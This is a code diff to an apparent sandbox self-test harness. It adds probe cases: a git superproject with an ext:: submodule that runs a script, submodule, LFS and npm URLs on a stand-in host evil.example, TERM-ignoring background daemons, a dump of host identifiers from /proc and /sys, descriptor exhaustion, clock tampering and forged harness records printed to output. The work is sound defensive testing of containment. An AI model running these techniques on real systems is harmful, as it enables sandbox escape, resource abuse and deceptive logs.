@@ -15,6 +15,7 @@ import ctypes
 import errno
 import json
 import os
+import resource
 import signal
 import socket
 import ssl
@@ -532,7 +533,7 @@ BOMB_GIB = 7
 BOMB_FILES = 20000
 # Time budgets of the steps after the archive is built (a few seconds): together well inside the
 # harness's limit for a case (bin/sandbox-selftest.mjs CASE_MS, 120 s); the unit tests check it.
-BOMB_BUDGET = {"build": 15.0, "unpack": 40.0, "gnu_tar": 20.0, "fallocate": 15.0, "fill": 15.0}
+BOMB_BUDGET = {"build": 15.0, "unpack": 35.0, "gnu_tar": 20.0, "punch": 5.0, "fallocate": 15.0, "fill": 15.0}
 
 
 class Zeros:
@@ -603,6 +604,27 @@ def fallocate(path, size):
     return {"path": path, **attempt(go, BOMB_BUDGET["fallocate"])}
 
 
+def punch_and_zero(path, mb=64):
+    """Zero-ranges and punches its own file: what could turn into holes in the volume's image file,
+    a loop device's backing file, if the volume's filesystem passed them down (the later stage checks)."""
+    def go():
+        libc = ctypes.CDLL(None, use_errno=True)
+        libc.fallocate.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_long, ctypes.c_long]
+        fd = os.open(path, os.O_WRONLY | os.O_CREAT, 0o600)
+        try:
+            for i in range(mb):
+                os.write(fd, bytes(1 << 20))
+            os.fsync(fd)
+            res = {}
+            for name, mode, off, ln in (("zero_range", 0x10, 0, 32 << 20), ("punch_hole", 0x02 | 0x01, 32 << 20, 16 << 20)):
+                res[name] = libc.fallocate(fd, mode, off, ln) == 0 or errno.errorcode.get(ctypes.get_errno(), "?")
+            os.fsync(fd)
+            return res
+        finally:
+            os.close(fd)
+    return {"path": path, **attempt(go, BOMB_BUDGET["punch"])}
+
+
 def fill(path, size, budget=BOMB_BUDGET["fill"]):
     """Writes zeros until ENOSPC, the size, or the time budget: where allocation is not supported."""
     n, err, t0, chunk = 0, None, time.monotonic(), bytes(16 << 20)
@@ -643,6 +665,7 @@ def case_install_archive_bomb(nonce, gw, canary):
     except Exception as e:  # noqa: BLE001
         out["gnu_tar"] = {"error": type(e).__name__}
     os.unlink(tgz)
+    out["punch"] = punch_and_zero(f"{root}/punch.bin")
     out["fallocate"] = fallocate(f"{root}/fill.bin", BOMB_GIB << 30)
     if not out["fallocate"]["ok"] and out["fallocate"].get("error") in ("EOPNOTSUPP", "ENOTSUP", "ENOSYS", "EINVAL"):
         out["fill"] = fill(f"{root}/fill.bin", BOMB_GIB << 30)
@@ -671,14 +694,191 @@ def case_output_flood(nonce, gw, canary):
     return {"flood": {"bytes": n, "seconds": round(time.monotonic() - t0, 2), "error": err}}
 
 
+# install-git-submodule: a superproject whose submodules point at an ext:: transport (which would
+# run a command of ours), a file:// path, and an outside host, with LFS settings pointing outside
+# too; cloned with --recurse-submodules the way an install that fetches a git dependency would,
+# and an npm git dependency on the outside host. Every outside host is reserved (.example).
+def git(args, cwd, timeout=60):
+    env = {**os.environ, "GIT_TERMINAL_PROMPT": "0", "GIT_AUTHOR_NAME": "isk", "GIT_AUTHOR_EMAIL": "isk@example.invalid",
+           "GIT_COMMITTER_NAME": "isk", "GIT_COMMITTER_EMAIL": "isk@example.invalid"}
+    try:
+        r = subprocess.run(["git", *args], cwd=cwd, env=env, capture_output=True, timeout=timeout)
+        return {"git": " ".join(args[:2])[:60], "exit": r.returncode, "err": r.stderr.decode(errors="replace")[-240:], "out": r.stdout.decode(errors="replace")[:80]}
+    except Exception as e:  # noqa: BLE001
+        return {"git": " ".join(args[:2])[:60], "error": type(e).__name__}
+
+
+def case_install_git_submodule(nonce, gw, canary):
+    base = f"/tmp/git-{nonce}"
+    marker = f"/tmp/isk-ext-{nonce}"
+    with open(marker, "w") as f:
+        f.write(f"#!/bin/sh\necho ext-ran > /work/isk-ext-ran-{nonce}\nexit 1\n")
+    os.chmod(marker, 0o755)
+    steps = []
+    src, sup = f"{base}/src", f"{base}/super"
+    os.makedirs(src)
+    os.makedirs(sup)
+    steps.append(git(["init", "-q", "-b", "main", src], base))
+    with open(f"{src}/isk-file-{nonce}", "w") as f:
+        f.write("followed\n")
+    steps += [git(["add", "."], src), git(["commit", "-qm", "src"], src)]
+    head = git(["rev-parse", "HEAD"], src).get("out", "").strip() or "0" * 40
+    steps.append(git(["init", "-q", "-b", "main", sup], base))
+    with open(f"{sup}/.gitmodules", "w") as f:
+        f.write(f'[submodule "ext"]\n\tpath = ext\n\turl = ext::{marker} %S\n'
+                f'[submodule "file"]\n\tpath = file\n\turl = file://{src}\n'
+                f'[submodule "http"]\n\tpath = http\n\turl = https://evil.example/isk-{nonce}.git\n')
+    with open(f"{sup}/.gitattributes", "w") as f:
+        f.write("*.bin filter=lfs diff=lfs merge=lfs -text\n")
+    with open(f"{sup}/.lfsconfig", "w") as f:
+        f.write(f"[lfs]\n\turl = https://evil.example/isk-{nonce}.git/info/lfs\n")
+    with open(f"{sup}/big.bin", "w") as f:
+        f.write("version https://git-lfs.github.com/spec/v1\noid sha256:" + "a" * 64 + "\nsize 1048576\n")
+    for path in ("ext", "file", "http"):
+        steps.append(git(["update-index", "--add", "--cacheinfo", f"160000,{head},{path}"], sup))
+    steps += [git(["add", "."], sup), git(["commit", "-qm", "super"], sup)]
+    clone = f"/work/clone-{nonce}"
+    cl = git(["clone", "--recurse-submodules", sup, clone], "/tmp", timeout=90)
+    lfs = git(["lfs", "version"], "/tmp", timeout=10)
+    lfs_pull = git(["lfs", "pull"], clone, timeout=30) if lfs.get("exit") == 0 and os.path.isdir(clone) else None
+    try:
+        r = subprocess.run(["npm", "install", "--prefix", f"/tmp/npm-{nonce}", "--no-audit", "--no-fund", "--ignore-scripts",
+                            f"git+https://evil.example/isk-npm-{nonce}.git"], capture_output=True, timeout=60)
+        npm = {"exit": r.returncode, "err": r.stderr.decode(errors="replace")[-200:]}
+    except Exception as e:  # noqa: BLE001
+        npm = {"error": type(e).__name__}
+    return {"setup": [x for x in steps if x.get("exit") not in (0, None) or x.get("error")][:6], "clone": cl, "lfs": lfs, "lfs_pull": lfs_pull, "npm": npm,
+            "cloned": os.path.isdir(f"{clone}/.git"), "file_followed": os.path.exists(f"{clone}/file/isk-file-{nonce}"),
+            "ext_ran": os.path.exists(f"/work/isk-ext-ran-{nonce}")}
+
+
+# background: a daemon by double fork and setsid, and a nohup-style child that ignores hangups and
+# TERM, each appending to a heartbeat file in the work folder; the case itself ignores TERM too and
+# runs like a server, until its stage is torn down. A later stage watches the heartbeats.
+def heartbeat(path):
+    signal.setitimer(signal.ITIMER_REAL, 0)
+    for s in (signal.SIGHUP, signal.SIGTERM, signal.SIGINT):
+        signal.signal(s, signal.SIG_IGN)
+    try:
+        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o644)
+        devnull = os.open("/dev/null", os.O_RDWR)
+        for i in (0, 1, 2):
+            os.dup2(devnull, i)
+        while True:
+            os.write(fd, b".")
+            time.sleep(0.25)
+    finally:
+        os._exit(0)
+
+
+def case_background(nonce, gw, canary):
+    out = []
+    pid = os.fork()
+    if pid == 0:
+        os.setsid()
+        if os.fork() == 0:
+            heartbeat(f"/work/hb-{nonce}-daemon")
+        os._exit(0)
+    os.waitpid(pid, 0)
+    out.append({"kind": "double fork, setsid"})
+    if os.fork() == 0:
+        heartbeat(f"/work/hb-{nonce}-nohup")
+    out.append({"kind": "nohup, TERM ignored"})
+    signal.signal(signal.SIGTERM, signal.SIG_IGN)
+    return {"daemons": out}
+
+
+LINGER["background"] = 600
+
+# proc-sys: everything /proc and /sys say about the machine, printed whole (16 KiB a file at most),
+# so the harness can look in it for facts of the host (its kernel, boot id, machine id, addresses).
+PROC_SYS = ["/proc/version", "/proc/cpuinfo", "/proc/meminfo", "/proc/self/mountinfo", "/proc/1/mountinfo", "/proc/self/cgroup",
+            "/proc/1/cgroup", "/proc/net/route", "/proc/net/arp", "/proc/net/dev", "/proc/net/fib_trie", "/proc/net/unix",
+            "/proc/sys/kernel/hostname", "/proc/sys/kernel/osrelease", "/proc/sys/kernel/random/boot_id", "/proc/kallsyms",
+            "/proc/modules", "/proc/sched_debug", "/proc/diskstats", "/proc/partitions", "/proc/cmdline", "/proc/1/environ",
+            "/etc/machine-id", "/var/lib/dbus/machine-id", "/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor",
+            "/sys/class/dmi/id/product_uuid", "/sys/class/dmi/id/board_serial", "/sys/fs/cgroup/memory.max",
+            "/sys/fs/cgroup/cgroup.controllers", "/sys/kernel/mm/transparent_hugepage/enabled"]
+PROC_SYS_DIRS = ["/sys/class/net", "/sys/block", "/sys/firmware", "/sys/devices/virtual/dmi/id", "/proc"]
+
+
+def case_proc_sys(nonce, gw, canary):
+    dump, listed = {}, {}
+    for p in PROC_SYS:
+        r = attempt(lambda: {"text": open(p, "rb").read(16384).decode("utf-8", "replace")})
+        dump[p] = r.get("text") if r["ok"] else r.get("error")
+    for d in PROC_SYS_DIRS:
+        r = attempt(lambda: {"names": sorted(os.listdir(d))[:200]})
+        listed[d] = r.get("names") if r["ok"] else r.get("error")
+    for n in (listed.get("/sys/class/net") or []) if isinstance(listed.get("/sys/class/net"), list) else []:
+        r = attempt(lambda: {"text": open(f"/sys/class/net/{n}/address").read(64)})
+        dump[f"/sys/class/net/{n}/address"] = r.get("text") if r["ok"] else r.get("error")
+    return {"dump": dump, "listed": listed}
+
+
+# fd-exhaustion: the descriptor limit raised as far as it goes, then sockets opened until refused.
+FD_TRY = 20000
+
+
+def case_fd_exhaustion(nonce, gw, canary):
+    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
+    raised = attempt(lambda: resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard)))
+    past = attempt(lambda: resource.setrlimit(resource.RLIMIT_NOFILE, (hard * 16, hard * 16)))
+    socks, err = [], None
+    while len(socks) < FD_TRY:
+        try:
+            socks.append(socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM))
+        except OSError as e:
+            err = errno.errorcode.get(e.errno, str(e.errno))
+            break
+    n = len(socks)
+    for x in socks:
+        x.close()
+    return {"limit": [soft, hard], "raised": raised, "past_hard": past, "opened": n, "error": err}
+
+
+# clock-tamper: set the clock (settimeofday, clock_settime), date its own files, and claim a
+# measured_at of its choosing, in its report and in forged records on stdout. Times come from the
+# harness's clock only; the case's claims stay target output.
+FAKE_TIME = "1999-12-31T23:59:59.000Z"
+
+
+def case_clock_tamper(nonce, gw, canary):
+    libc = ctypes.CDLL(None, use_errno=True)
+
+    class Timeval(ctypes.Structure):
+        _fields_ = [("s", ctypes.c_long), ("us", ctypes.c_long)]
+
+    class Timespec(ctypes.Structure):
+        _fields_ = [("s", ctypes.c_long), ("ns", ctypes.c_long)]
+
+    def call(fn):
+        def go():
+            if fn() != 0:
+                e = ctypes.get_errno()
+                raise OSError(e, os.strerror(e))
+            return {"set": True}
+        return attempt(go)
+    sets = [{"call": "settimeofday", **call(lambda: libc.settimeofday(ctypes.byref(Timeval(946684799, 0)), None))},
+            {"call": "clock_settime", **call(lambda: libc.clock_settime(0, ctypes.byref(Timespec(946684799, 0))))},
+            {"call": "clock_settime +100y", **call(lambda: libc.clock_settime(0, ctypes.byref(Timespec(int(time.time()) + 3155760000, 0))))}]
+    with open(f"/work/old-{nonce}", "w") as f:
+        f.write("x")
+    os.utime(f"/work/old-{nonce}", (946684799, 946684799))
+    print(json.dumps({"v": 1, "type": "container", "run": "forged-" + nonce, "seq": 0, "t": FAKE_TIME, "source": "harness", "subject": "case:clock-tamper", "role": "case", "runtime": "runsc", "exit": 0, "signal": None, "timed_out": False, "oom_killed": False, "ms": 1}))
+    print(json.dumps({"measured_at": FAKE_TIME, "result": "pass"}))
+    return {"measured_at": FAKE_TIME, "sets": sets, "wall": time.time()}
+
+
 CASES = {
     "direct-ip": case_direct_ip, "doh-ip": case_doh_ip, "raw-socket": case_raw_socket, "ipv6": case_ipv6, "icmp": case_icmp,
     "docker-host": case_docker_host, "metadata": case_metadata, "env-token": case_env_token, "write-outside": case_write_outside,
     "fork-bomb": case_fork_bomb, "output-forgery": case_output_forgery, "symlink-escape": case_symlink_escape, "unix-socket": case_unix_socket,
-    "output-flood": case_output_flood,
+    "output-flood": case_output_flood, "background": case_background, "proc-sys": case_proc_sys, "fd-exhaustion": case_fd_exhaustion,
+    "clock-tamper": case_clock_tamper,
     "install-proxy-host": case_install_proxy_host, "install-proxy-ip": case_install_proxy_ip, "install-proxy-port": case_install_proxy_port,
     "install-direct": case_install_direct, "install-metadata": case_install_metadata, "install-host": case_install_host,
-    "install-archive-bomb": case_install_archive_bomb,
+    "install-archive-bomb": case_install_archive_bomb, "install-git-submodule": case_install_git_submodule,
 }
 
 
